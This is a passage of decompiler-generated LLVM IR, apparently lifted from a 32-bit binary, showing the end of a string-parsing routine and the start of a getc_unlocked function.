  store i32 %v6_804e8aa, i32* %eax.global-to-local, align 4
  %v4_804e8ac = icmp eq i8 %v2_804e8aa, 0
  br i1 %v4_804e8ac, label %dec_label_pc_804ea60, label %dec_label_pc_804e8b4

dec_label_pc_804e8b4:                             ; preds = %dec_label_pc_804e8a3
  store i32 ptrtoint ([21 x i8]* @global_var_80509dd.121 to i32), i32* %ecx.global-to-local, align 4
  %v3_804e8b9 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_804e8b9, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e8bd

dec_label_pc_804e8bd:                             ; preds = %dec_label_pc_804e90c, %dec_label_pc_804e8b4
  %v0_804e90c = phi i32 [ %v1_804e90c, %dec_label_pc_804e90c ], [ ptrtoint ([21 x i8]* @global_var_80509dd.121 to i32), %dec_label_pc_804e8b4 ]
  %v3_804e8bd = inttoptr i32 %v0_804e90c to i8*
  %v4_804e8bd = load i8, i8* %v3_804e8bd, align 1
  %v15_804e8bd = icmp eq i8 %v2_804e8aa, %v4_804e8bd
  %v1_804e8bf = icmp eq i1 %v15_804e8bd, false
  br i1 %v1_804e8bf, label %dec_label_pc_804e90c, label %dec_label_pc_804e8c1

dec_label_pc_804e8c1:                             ; preds = %dec_label_pc_804e8bd
  %v1_804e8c3 = add i32 %v0_804e90c, -134547933
  store i32 %v1_804e8c3, i32* %edx.global-to-local, align 4
  %v7_804e8cc = icmp sgt i32 %v1_804e8c3, 17
  br i1 %v7_804e8cc, label %dec_label_pc_804e8ce, label %dec_label_pc_804e8d6

dec_label_pc_804e8ce:                             ; preds = %dec_label_pc_804e8c1
  %v3_804e8ce = and i32 %v2_804e8a7, 1024
  %v4_804e8ce = icmp eq i32 %v3_804e8ce, 0
  br i1 %v4_804e8ce, label %dec_label_pc_804e8d6, label %dec_label_pc_804e8d3

dec_label_pc_804e8d3:                             ; preds = %dec_label_pc_804e8ce
  %v1_804e8d3 = add i32 %v0_804e90c, -134547935
  store i32 %v1_804e8d3, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e8d6

dec_label_pc_804e8d6:                             ; preds = %dec_label_pc_804e8c1, %dec_label_pc_804e8ce, %dec_label_pc_804e8d3
  %v0_804e8df = phi i32 [ %v1_804e8c3, %dec_label_pc_804e8c1 ], [ %v1_804e8c3, %dec_label_pc_804e8ce ], [ %v1_804e8d3, %dec_label_pc_804e8d3 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_80509d3.122 to i32), i32* %ecx.global-to-local, align 4
  %v2_804e8df = add i32 %tmp76, 32
  %v3_804e8df = inttoptr i32 %v2_804e8df to i32*
  store i32 %v0_804e8df, i32* %v3_804e8df, align 4
  %v0_804e8e2.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_804e8e6.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804e8e2

dec_label_pc_804e8e2:                             ; preds = %dec_label_pc_804e8e2, %dec_label_pc_804e8d6
  %v0_804e8e2 = phi i32 [ %v1_804e8e2, %dec_label_pc_804e8e2 ], [ %v0_804e8e2.pre, %dec_label_pc_804e8d6 ]
  %v1_804e8e2 = add i32 %v0_804e8e2, 1
  store i32 %v1_804e8e2, i32* %ecx.global-to-local, align 4
  %v1_804e8e3 = inttoptr i32 %v1_804e8e2 to i8*
  %v2_804e8e3 = load i8, i8* %v1_804e8e3, align 1
  %v3_804e8e3 = sext i8 %v2_804e8e3 to i32
  store i32 %v3_804e8e3, i32* %eax.global-to-local, align 4
  %v8_804e8e8 = icmp sgt i32 %v0_804e8e6.pre, %v3_804e8e3
  br i1 %v8_804e8e8, label %dec_label_pc_804e8e2, label %dec_label_pc_804e8ea

dec_label_pc_804e8ea:                             ; preds = %dec_label_pc_804e8e2
  store i32 ptrtoint ([21 x i8]* @global_var_80509dd.121 to i32), i32* @ecx, align 4
  %v1_804e8f1 = add i32 %v0_804e8e2, -134547923
  store i32 %v1_804e8f1, i32* %eax.global-to-local, align 4
  %v2_804e8f6 = add i32 %v0_804e8e2, add (i32 ptrtoint (i32* @global_var_80509c4.123 to i32), i32 -134547923)
  %v3_804e8f6 = add i32 %v2_804e8f6, %v1_804e8f1
  %v4_804e8f6 = inttoptr i32 %v3_804e8f6 to i16*
  %v5_804e8f6 = load i16, i16* %v4_804e8f6, align 2
  %v6_804e8f6 = sext i16 %v5_804e8f6 to i32
  store i32 %v6_804e8f6, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_804e8f1, 2
  %v3_804e8fe = add i32 %factor, 134547892
  %v4_804e8fe = inttoptr i32 %v3_804e8fe to i16*
  %v5_804e8fe = load i16, i16* %v4_804e8fe, align 2
  %v6_804e8fe = sext i16 %v5_804e8fe to i32
  store i32 %v6_804e8fe, i32* %eax.global-to-local, align 4
  %v1_804e906 = load i32, i32* %ebx.global-to-local, align 4
  %v2_804e906 = or i32 %v1_804e906, %v6_804e8f6
  %v2_804e908 = and i32 %v2_804e906, %v6_804e8fe
  store i32 %v2_804e908, i32* %edx.global-to-local, align 4
  %v0_804e91a.pre = load i32, i32* @esi, align 4
  %v0_804e91d.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804e912

dec_label_pc_804e90c:                             ; preds = %dec_label_pc_804e8bd
  %v1_804e90c = add i32 %v0_804e90c, 1
  store i32 %v1_804e90c, i32* @ecx, align 4
  %v1_804e90d = inttoptr i32 %v1_804e90c to i8*
  %v2_804e90d = load i8, i8* %v1_804e90d, align 1
  %v3_804e90d = icmp eq i8 %v2_804e90d, 0
  %v1_804e910 = icmp eq i1 %v3_804e90d, false
  br i1 %v1_804e910, label %dec_label_pc_804e8bd, label %dec_label_pc_804e912

dec_label_pc_804e912:                             ; preds = %dec_label_pc_804e90c, %dec_label_pc_804e8ea
  %v0_804e91d = phi i32 [ %v0_804e91d.pre, %dec_label_pc_804e8ea ], [ %storemerge4, %dec_label_pc_804e90c ]
  %v0_804e91a = phi i32 [ %v0_804e91a.pre, %dec_label_pc_804e8ea ], [ %v0_804e8aa, %dec_label_pc_804e90c ]
  %v0_804e912 = phi i32 [ %v2_804e908, %dec_label_pc_804e8ea ], [ %v3_804e8b9, %dec_label_pc_804e90c ]
  store i32 %v0_804e912, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_804e91a = inttoptr i32 %v0_804e91a to i8*
  %v2_804e91a = load i8, i8* %v1_804e91a, align 1
  %v3_804e91a = sext i8 %v2_804e91a to i32
  store i32 %v3_804e91a, i32* %eax.global-to-local, align 4
  %v2_804e91d = add i32 %tmp76, 4
  %v3_804e91d = inttoptr i32 %v2_804e91d to i32*
  store i32 %v0_804e91d, i32* %v3_804e91d, align 4
  %v0_804e920 = load i32, i32* %eax.global-to-local, align 4
  %v1_804e920 = load i32, i32* @edx, align 4
  %v2_804e920 = add i32 %v1_804e920, 12
  %v3_804e920 = inttoptr i32 %v2_804e920 to i32*
  store i32 %v0_804e920, i32* %v3_804e920, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_804e927 = load i32, i32* @edx, align 4
  %v1_804e927 = add i32 %v0_804e927, 28
  %v2_804e927 = inttoptr i32 %v1_804e927 to i32*
  store i32 1, i32* %v2_804e927, align 4
  %v0_804e92e = load i32, i32* %eax.global-to-local, align 4
  %v1_804e92e = load i32, i32* @edx, align 4
  %v2_804e92e = add i32 %v1_804e92e, 8
  %v3_804e92e = inttoptr i32 %v2_804e92e to i32*
  store i32 %v0_804e92e, i32* %v3_804e92e, align 4
  %v0_804e931 = load i32, i32* %edi.global-to-local, align 4
  %v1_804e93b = and i32 %v0_804e931, -5
  %v0_804e941 = load i32, i32* %ebx.global-to-local, align 4
  %v1_804e941 = and i32 %v0_804e941, 3840
  store i32 %v1_804e941, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_804e94a = or i32 %v1_804e941, %v1_804e93b
  store i32 %v2_804e94a, i32* @edi, align 4
  %v1_804e94c = load i32, i32* @edx, align 4
  %v2_804e94c = add i32 %v1_804e94c, 20
  %v3_804e94c = inttoptr i32 %v2_804e94c to i32*
  store i32 48, i32* %v3_804e94c, align 4
  %v0_804e94f = load i32, i32* @edi, align 4
  %v1_804e94f = load i32, i32* @edx, align 4
  %v2_804e94f = add i32 %v1_804e94f, 16
  %v3_804e94f = inttoptr i32 %v2_804e94f to i32*
  store i32 %v0_804e94f, i32* %v3_804e94f, align 4
  %v0_804e952 = load i32, i32* @ecx, align 4
  %v1_804e952 = inttoptr i32 %v0_804e952 to i8*
  %v2_804e952 = load i8, i8* %v1_804e952, align 1
  %v3_804e952 = icmp eq i8 %v2_804e952, 0
  %v1_804e955 = icmp eq i1 %v3_804e952, false
  br i1 %v1_804e955, label %dec_label_pc_804e96e, label %dec_label_pc_804e957

dec_label_pc_804e957:                             ; preds = %dec_label_pc_804e912
  %v0_804e957 = load i32, i32* @esi, align 4
  %v1_804e957 = inttoptr i32 %v0_804e957 to i8*
  %v2_804e957 = load i8, i8* %v1_804e957, align 1
  %v11_804e957 = icmp eq i8 %v2_804e957, 109
  %v1_804e95a = icmp eq i1 %v11_804e957, false
  br i1 %v1_804e95a, label %dec_label_pc_804ea60, label %dec_label_pc_804e960

dec_label_pc_804e960:                             ; preds = %dec_label_pc_804e957
  %v0_804e960 = load i32, i32* @edx, align 4
  %v1_804e960 = add i32 %v0_804e960, 32
  %v2_804e960 = inttoptr i32 %v1_804e960 to i32*
  store i32 20, i32* %v2_804e960, align 4
  %v0_804e967 = load i32, i32* @edx, align 4
  %v1_804e967 = add i32 %v0_804e967, 28
  %v2_804e967 = inttoptr i32 %v1_804e967 to i32*
  store i32 0, i32* %v2_804e967, align 4
  br label %dec_label_pc_804e96e

dec_label_pc_804e96e:                             ; preds = %dec_label_pc_804e912, %dec_label_pc_804e960
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_804ea02, label %dec_label_pc_804e979

dec_label_pc_804e979:                             ; preds = %dec_label_pc_804e96e
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_804e9ba = add i32 %tmp76, 40
  %v1_804e9f3 = add i32 %tmp76, 28
  %v2_804e9f3 = inttoptr i32 %v1_804e9f3 to i32*
  %v4_804e988 = add i32 %tmp76, 36
  br label %dec_label_pc_804e97b

dec_label_pc_804e97b:                             ; preds = %dec_label_pc_804e9ee, %dec_label_pc_804e979
  %v0_804e991 = phi i32 [ 0, %dec_label_pc_804e979 ], [ %v1_804e9f2, %dec_label_pc_804e9ee ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804e979 ], [ %stack_var_-88.5, %dec_label_pc_804e9ee ]
  %v1_804e97b = add i32 %v0_804e991, -2
  %v6_804e97b = sub i32 1, %v0_804e991
  %v7_804e97b = and i32 %v6_804e97b, %v0_804e991
  %v8_804e97b = icmp slt i32 %v7_804e97b, 0
  %v9_804e97b = icmp eq i32 %v1_804e97b, 0
  %v10_804e97b = icmp slt i32 %v1_804e97b, 0
  %v3_804e97e = icmp eq i1 %v10_804e97b, %v8_804e97b
  %v4_804e97e = icmp eq i1 %v9_804e97b, false
  %v5_804e97e = and i1 %v4_804e97e, %v3_804e97e
  br i1 %v5_804e97e, label %dec_label_pc_804e991, label %dec_label_pc_804e980

dec_label_pc_804e980:                             ; preds = %dec_label_pc_804e97b
  store i32 %tmp76, i32* @edx, align 4
  %v0_804e984 = load i32, i32* @esp, align 4
  %v2_804e984 = mul i32 %v0_804e991, 4
  %v3_804e984 = add i32 %v2_804e984, 68
  %v4_804e984 = add i32 %v3_804e984, %v0_804e984
  %v5_804e984 = inttoptr i32 %v4_804e984 to i32*
  %v6_804e984 = load i32, i32* %v5_804e984, align 4
  store i32 %v6_804e984, i32* %eax.global-to-local, align 4
  %v1_804e988 = trunc i32 %v6_804e984 to i8
  %v5_804e988 = add i32 %v4_804e988, %v0_804e991
  %v6_804e988 = inttoptr i32 %v5_804e988 to i8*
  store i8 %v1_804e988, i8* %v6_804e988, align 1
  %v0_804e98c = load i32, i32* %eax.global-to-local, align 4
  %v1_804e98c = urem i32 %v0_804e98c, 256
  br label %dec_label_pc_804e99a

dec_label_pc_804e991:                             ; preds = %dec_label_pc_804e97b
  %v5_804e993 = add i32 %v0_804e991, %stack_var_-32.3
  store i32 %v5_804e993, i32* %eax.global-to-local, align 4
  %v1_804e997 = add i32 %v5_804e993, -2
  br label %dec_label_pc_804e99a

dec_label_pc_804e99a:                             ; preds = %dec_label_pc_804e980, %dec_label_pc_804e991
  %v0_804e9ad = phi i32 [ %v1_804e98c, %dec_label_pc_804e980 ], [ %v1_804e997, %dec_label_pc_804e991 ]
  store i32 %v0_804e9ad, i32* %eax.global-to-local, align 4
  %v5_804e99a = sub i32 %v0_804e9ad, %stack_var_-88.4
  %v11_804e99a = xor i32 %v0_804e9ad, %stack_var_-88.4
  %v12_804e99a = xor i32 %v5_804e99a, %v0_804e9ad
  %v13_804e99a = and i32 %v12_804e99a, %v11_804e99a
  %v14_804e99a = icmp slt i32 %v13_804e99a, 0
  %v15_804e99a = icmp eq i32 %v5_804e99a, 0
  %v16_804e99a = icmp slt i32 %v5_804e99a, 0
  %v3_804e99e = icmp ne i1 %v16_804e99a, %v14_804e99a
  %v4_804e99e = or i1 %v15_804e99a, %v3_804e99e
  br i1 %v4_804e99e, label %dec_label_pc_804e9ad, label %dec_label_pc_804e9a0

dec_label_pc_804e9a0:                             ; preds = %dec_label_pc_804e99a
  %v1_804e9a0 = add i32 %v0_804e9ad, -9
  %v6_804e9a0 = sub i32 8, %v0_804e9ad
  %v7_804e9a0 = and i32 %v6_804e9a0, %v0_804e9ad
  %v8_804e9a0 = icmp slt i32 %v7_804e9a0, 0
  %v9_804e9a0 = icmp eq i32 %v1_804e9a0, 0
  %v10_804e9a0 = icmp slt i32 %v1_804e9a0, 0
  %v3_804e9a3 = icmp eq i1 %v10_804e9a0, %v8_804e9a0
  %v4_804e9a3 = icmp eq i1 %v9_804e9a0, false
  %v5_804e9a3 = and i1 %v4_804e9a3, %v3_804e9a3
  br i1 %v5_804e9a3, label %dec_label_pc_804ea60, label %dec_label_pc_804e9ad

dec_label_pc_804e9ad:                             ; preds = %dec_label_pc_804e9a0, %dec_label_pc_804e99a
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_804e99a ], [ %v0_804e9ad, %dec_label_pc_804e9a0 ]
  %v1_804e9ad = add i32 %v0_804e9ad, -1
  store i32 %v1_804e9ad, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_804e9b6 = load i32, i32* @esp, align 4
  %v1_804e9b6 = load i32, i32* %ebp.global-to-local, align 4
  %v2_804e9b6 = mul i32 %v1_804e9b6, 4
  %v3_804e9b6 = add i32 %v0_804e9b6, 80
  %v4_804e9b6 = add i32 %v3_804e9b6, %v2_804e9b6
  %v5_804e9b6 = inttoptr i32 %v4_804e9b6 to i32*
  %v6_804e9b6 = load i32, i32* %v5_804e9b6, align 4
  store i32 %v6_804e9b6, i32* %edi.global-to-local, align 4
  %v2_804e9ba = mul i32 %v1_804e9ad, 4
  %v4_804e9ba = add i32 %v3_804e9ba, %v2_804e9ba
  %v5_804e9ba = inttoptr i32 %v4_804e9ba to i32*
  %v6_804e9ba = load i32, i32* %v5_804e9ba, align 4
  store i32 %v6_804e9ba, i32* @eax, align 4
  %v9_804e9be = icmp eq i32 %v6_804e9b6, 8
  br i1 %v9_804e9be, label %dec_label_pc_804e9ee, label %dec_label_pc_804e9c3

dec_label_pc_804e9c3:                             ; preds = %dec_label_pc_804e9ad
  %v9_804e9c3 = icmp eq i32 %v6_804e9ba, 8
  br i1 %v9_804e9c3, label %dec_label_pc_804e9de, label %dec_label_pc_804e9c8

dec_label_pc_804e9c8:                             ; preds = %dec_label_pc_804e9c3
  %v12_804e9c8 = icmp eq i32 %v6_804e9ba, %v6_804e9b6
  br i1 %v12_804e9c8, label %dec_label_pc_804e9de, label %dec_label_pc_804e9cc

dec_label_pc_804e9cc:                             ; preds = %dec_label_pc_804e9c8
  %v1_804e9cc = call i32 @_promoted_size(i32 %v1_804e9ad)
  store i32 %v1_804e9cc, i32* %ebx.global-to-local, align 4
  %v0_804e9d3 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_804e9d3, i32* @eax, align 4
  %v1_804e9d5 = call i32 @_promoted_size(i32 %v1_804e9ad)
  store i32 %v1_804e9d5, i32* %eax.global-to-local, align 4
  %v8_804e9dc = icmp sgt i32 %v1_804e9cc, %v1_804e9d5
  br i1 %v8_804e9dc, label %dec_label_pc_804e9ee, label %dec_label_pc_804e9cc.dec_label_pc_804e9de_crit_edge

dec_label_pc_804e9cc.dec_label_pc_804e9de_crit_edge: ; preds = %dec_label_pc_804e9cc
  %v0_804e9e6.pre = load i32, i32* @esp, align 4
  %v1_804e9e6.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_804e9de

dec_label_pc_804e9de:                             ; preds = %dec_label_pc_804e9cc.dec_label_pc_804e9de_crit_edge, %dec_label_pc_804e9c8, %dec_label_pc_804e9c3
  %v1_804e9e6 = phi i32 [ %v1_804e9e6.pre, %dec_label_pc_804e9cc.dec_label_pc_804e9de_crit_edge ], [ %v1_804e9b6, %dec_label_pc_804e9c8 ], [ %v1_804e9b6, %dec_label_pc_804e9c3 ]
  %v0_804e9e6 = phi i32 [ %v0_804e9e6.pre, %dec_label_pc_804e9cc.dec_label_pc_804e9de_crit_edge ], [ %v0_804e9b6, %dec_label_pc_804e9c8 ], [ %v0_804e9b6, %dec_label_pc_804e9c3 ]
  store i32 %v1_804e9ad, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v2_804e9e6 = mul i32 %v1_804e9e6, 4
  %v3_804e9e6 = add i32 %v0_804e9e6, 80
  %v4_804e9e6 = add i32 %v3_804e9e6, %v2_804e9e6
  %v5_804e9e6 = inttoptr i32 %v4_804e9e6 to i32*
  %v6_804e9e6 = load i32, i32* %v5_804e9e6, align 4
  store i32 %v6_804e9e6, i32* %eax.global-to-local, align 4
  store i32 %v6_804e9e6, i32* %v5_804e9ba, align 4
  br label %dec_label_pc_804e9ee

dec_label_pc_804e9ee:                             ; preds = %dec_label_pc_804e9cc, %dec_label_pc_804e9ad, %dec_label_pc_804e9de
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804e9f2 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804e9f2 = add i32 %v0_804e9f2, 1
  store i32 %v1_804e9f2, i32* %ebp.global-to-local, align 4
  %v3_804e9f3 = load i32, i32* %v2_804e9f3, align 4
  %v1_804e9f6 = add i32 %v3_804e9f3, 2
  store i32 %v1_804e9f6, i32* %eax.global-to-local, align 4
  %v5_804e9fb = icmp slt i32 %v1_804e9f2, %v1_804e9f6
  br i1 %v5_804e9fb, label %dec_label_pc_804e97b, label %dec_label_pc_804ea29

dec_label_pc_804ea02:                             ; preds = %dec_label_pc_804e96e
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  %v1_804ea06 = add i32 %tmp76, 38
  %v2_804ea06 = inttoptr i32 %v1_804ea06 to i8*
  store i8 1, i8* %v2_804ea06, align 1
  store i32 %tmp76, i32* %edx.global-to-local, align 4
  %v1_804ea0f = add i32 %tmp76, 28
  %v2_804ea0f = inttoptr i32 %v1_804ea0f to i32*
  %v3_804ea0f = load i32, i32* %v2_804ea0f, align 4
  %v2_804ea12 = mul i32 %v3_804ea0f, 4
  %v2_804ea16 = ptrtoint i32* %stack_var_-20 to i32
  %v1_804ea1d = add i32 %tmp76, 40
  store i32 %v1_804ea1d, i32* %eax.global-to-local, align 4
  %v3_804ea21 = inttoptr i32 %v1_804ea1d to i16*
  %v4_804ea21 = call i32 @memcpy(i16* %v3_804ea21, i32 %v2_804ea16, i32 %v2_804ea12)
  store i32 %v4_804ea21, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804ea29

dec_label_pc_804ea29:                             ; preds = %dec_label_pc_804e9ee, %dec_label_pc_804ea02
  %stack_var_-88.6 = phi i32 [ %stack_var_-88.3, %dec_label_pc_804ea02 ], [ %stack_var_-88.5, %dec_label_pc_804e9ee ]
  store i32 %tmp76, i32* @ecx, align 4
  store i32 %stack_var_-88.6, i32* %eax.global-to-local, align 4
  store i32 %stack_var_-88.6, i32* %v2_804e6d4, align 4
  %v0_804ea34 = load i32, i32* @ecx, align 4
  %v1_804ea34 = add i32 %v0_804ea34, 16
  %v2_804ea34 = inttoptr i32 %v1_804ea34 to i8*
  %v3_804ea34 = load i8, i8* %v2_804ea34, align 1
  %v5_804ea34 = icmp slt i8 %v3_804ea34, 0
  br i1 %v5_804ea34, label %dec_label_pc_804ea41, label %dec_label_pc_804ea3a

dec_label_pc_804ea3a:                             ; preds = %dec_label_pc_804ea29
  %v0_804ea3a = load i32, i32* @esi, align 4
  %v1_804ea3a = add i32 %v0_804ea3a, 1
  store i32 %v1_804ea3a, i32* %eax.global-to-local, align 4
  %v2_804ea3d = inttoptr i32 %v0_804ea34 to i32*
  store i32 %v1_804ea3a, i32* %v2_804ea3d, align 4
  br label %dec_label_pc_804ea54

dec_label_pc_804ea41:                             ; preds = %dec_label_pc_804ea29
  store i32 %v4_804e6a8, i32* %edx.global-to-local, align 4
  store i32 %tmp76, i32* @ecx, align 4
  %v0_804ea49 = load i32, i32* @esi, align 4
  %v2_804ea49 = sub i32 %v0_804ea49, %v4_804e6a8
  store i32 %v2_804ea49, i32* %esi.global-to-local, align 4
  %v1_804ea4b = mul i32 %v2_804ea49, 4
  %v2_804ea4b = add i32 %v1_804ea4b, 224
  store i32 %v2_804ea4b, i32* %eax.global-to-local, align 4
  %v2_804ea52 = load i32, i32* %arg1, align 4
  %v4_804ea52 = add i32 %v2_804ea52, %v2_804ea4b
  store i32 %v4_804ea52, i32* %arg1, align 4
  br label %dec_label_pc_804ea54

dec_label_pc_804ea54:                             ; preds = %dec_label_pc_804ea3a, %dec_label_pc_804ea41
  store i32 %tmp76, i32* @edx, align 4
  %v1_804ea58 = add i32 %tmp76, 28
  %v2_804ea58 = inttoptr i32 %v1_804ea58 to i32*
  %v3_804ea58 = load i32, i32* %v2_804ea58, align 4
  store i32 %v3_804ea58, i32* %eax.global-to-local, align 4
  %v1_804ea5b = add i32 %v3_804ea58, 2
  br label %dec_label_pc_804ea63

dec_label_pc_804ea60:                             ; preds = %dec_label_pc_804e6f9, %dec_label_pc_804e793, %dec_label_pc_804e7c6, %dec_label_pc_804e841, %dec_label_pc_804e82d, %dec_label_pc_804e824, %dec_label_pc_804e9a0, %dec_label_pc_804e957, %dec_label_pc_804e8a3
  br label %dec_label_pc_804ea63

dec_label_pc_804ea63:                             ; preds = %dec_label_pc_804ea54, %dec_label_pc_804ea60
  %storemerge6 = phi i32 [ %v1_804ea5b, %dec_label_pc_804ea54 ], [ -1, %dec_label_pc_804ea60 ]
  store i32 %storemerge6, i32* %eax.global-to-local, align 4
  %v2_804ea66 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804ea66, i32* @ebx, align 4
  store i32 %v0_804e6a7, i32* @esi, align 4
  store i32 %v0_804e6a6, i32* @edi, align 4
  ret i32 %storemerge6

; uselistorder directives
  uselistorder i32 %stack_var_-88.6, { 1, 0 }
  uselistorder i32 %v1_804e9f2, { 0, 2, 1 }
  uselistorder i32 %v1_804e9ad, { 3, 2, 1, 0, 4 }
  uselistorder i32 %v1_804e9a0, { 1, 0 }
  uselistorder i32 %v5_804e99a, { 1, 2, 0 }
  uselistorder i32 %v0_804e9ad, { 4, 3, 0, 6, 5, 1, 2, 7, 8 }
  uselistorder i32 %v1_804e97b, { 1, 0 }
  uselistorder i32 %stack_var_-88.4, { 1, 0, 2 }
  uselistorder i32 %v0_804e991, { 0, 1, 3, 2, 5, 4 }
  uselistorder i32 %v1_804e90c, { 1, 2, 0 }
  uselistorder i32 %v1_804e8e2, { 1, 2, 0 }
  uselistorder i32 %v0_804e90c, { 2, 0, 1, 3 }
  uselistorder i32 %v2_804e8a7, { 1, 0 }
  uselistorder i32 %v1_804e896, { 0, 1, 4, 3, 2 }
  uselistorder i32 %v0_804e89f, { 0, 1, 2, 3, 6, 5, 4 }
  uselistorder i32 %v1_804e889, { 0, 2, 3, 1 }
  uselistorder i32 %v6_804e87f, { 1, 0 }
  uselistorder i32 %v1_804e861, { 1, 0 }
  uselistorder i32 %v0_804e87f.pre.pre, { 0, 3, 1, 2 }
  uselistorder i32 %stack_var_-88.3, { 3, 2, 1, 4, 0 }
  uselistorder i32 %stack_var_-32.3, { 1, 0 }
  uselistorder i32 %v1_804e844, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v0_804e83b, { 1, 2, 0 }
  uselistorder i32 %v0_804e801, { 1, 0 }
  uselistorder i32 %v1_804e7f3, { 1, 0 }
  uselistorder i32 %v1_804e7ee, { 0, 1, 3, 2 }
  uselistorder i32 %v6_804e7ec, { 2, 0, 1 }
  uselistorder i32 %v0_804e80e, { 0, 2, 4, 3, 1 }
  uselistorder i32 %v2_804e7a9, { 1, 2, 0 }
  uselistorder i32 %v0_804e781, { 0, 1, 2, 6, 3, 4, 5, 7 }
  uselistorder i32 %v0_804e774.lcssa, { 0, 1, 2, 4, 3 }
  uselistorder i32 %v1_804e76d.lcssa, { 0, 1, 2, 3, 5, 8, 7, 4, 6 }
  uselistorder i32 %v2_804e777, { 1, 2, 0 }
  uselistorder i32 %v6_804e775, { 0, 2, 1 }
  uselistorder i32 %v1_804e774, { 0, 2, 3, 1 }
  uselistorder i32 %v3_804e76d, { 2, 1, 0 }
  uselistorder i32 %v1_804e765, { 1, 0 }
  uselistorder i32 %v1_804e76d137, { 1, 0, 4, 2, 3 }
  uselistorder i32 %v0_804e75d, { 1, 0, 2 }
  uselistorder i32 %stack_var_-88.1, { 0, 1, 3, 4, 2, 6, 5, 7 }
  uselistorder i32 %v0_804e750, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v8_804e74b, { 1, 0, 3, 2 }
  uselistorder i32 %v1_804e721, { 0, 2, 1 }
  uselistorder i32 %v2_804e710, { 1, 0 }
  uselistorder i32 %v0_804e70e, { 2, 0, 1 }
  uselistorder i32 %v4_804e6a8, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 0, 2, 1 }
  uselistorder i32* %stack_var_-20, { 2, 0, 1 }
  uselistorder i32 %tmp76, { 24, 23, 22, 21, 1, 20, 19, 18, 17, 16, 15, 14, 13, 0, 2, 3, 4, 12, 11, 10, 9, 8, 7, 6, 5 }
  uselistorder i32* %edx.global-to-local, { 0, 1, 2, 3, 5, 4, 6, 7, 8, 9 }
  uselistorder i32* %edi.global-to-local, { 0, 1, 4, 2, 5, 3, 6, 7 }
  uselistorder i32* %ebp.global-to-local, { 2, 4, 3, 5, 6, 0, 1, 7 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 15, 12, 13, 14, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 42, 30, 29, 31, 32, 34, 33, 44, 43, 35, 36, 37, 38, 39, 40, 41 }
  uselistorder i32 224, { 1, 0, 2 }
  uselistorder i32 38, { 1, 0 }
  uselistorder i32 (i32)* @_promoted_size, { 1, 0 }
  uselistorder i32 -5, { 1, 0 }
  uselistorder i32 -134547923, { 1, 0 }
  uselistorder i32 17, { 2, 1, 0, 5, 4, 3 }
  uselistorder i32 ptrtoint ([21 x i8]* @global_var_80509dd.121 to i32), { 1, 0, 2 }
  uselistorder i32 -2147483648, { 4, 7, 1, 2, 3, 5, 6, 0 }
  uselistorder i32 5, { 1, 2, 9, 3, 8, 11, 12, 13, 0, 7, 4, 5, 10, 6, 14, 15 }
  uselistorder i8 109, { 1, 0 }
  uselistorder i32 -48, { 1, 3, 4, 5, 2, 0 }
  uselistorder i32* @global_var_8052038, { 5, 0, 6, 2, 7, 1, 3, 8, 4 }
  uselistorder i32 80, { 5, 6, 7, 8, 9, 10, 1, 0, 2, 3, 4 }
  uselistorder i32* %arg1, { 0, 1, 3, 2, 4 }
  uselistorder label %dec_label_pc_804ea63, { 1, 0 }
  uselistorder label %dec_label_pc_804ea60, { 6, 7, 8, 3, 4, 5, 2, 1, 0 }
  uselistorder label %dec_label_pc_804ea54, { 1, 0 }
  uselistorder label %dec_label_pc_804ea29, { 1, 0 }
  uselistorder label %dec_label_pc_804e9ee, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e99a, { 1, 0 }
  uselistorder label %dec_label_pc_804e96e, { 1, 0 }
  uselistorder label %dec_label_pc_804e8d6, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804e8a3, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e87a, { 1, 0 }
  uselistorder label %dec_label_pc_804e851, { 1, 0 }
  uselistorder label %dec_label_pc_804e818, { 1, 0, 3, 2 }
  uselistorder label %dec_label_pc_804e7bb, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804e774, { 1, 0 }
  uselistorder label %dec_label_pc_804e765, { 1, 0 }
  uselistorder label %dec_label_pc_804e75b, { 1, 0 }
  uselistorder label %dec_label_pc_804e744, { 1, 0 }
  uselistorder label %dec_label_pc_804e744.outer, { 2, 0, 1 }
}

define i32 @getc_unlocked() local_unnamed_addr {
entry:
  %edx.global-to-local = alloca i32, align 4
  %tmp = call i16* @__decompiler_undefined_function_2()
  %stack_var_-5 = alloca i8, align 1
  %v0_804ea6c = load i32, i32* @ebx, align 4
  %v4_804ea70 = ptrtoint i16* %tmp to i32
  store i32 %v4_804ea70, i32* @ebx, align 4
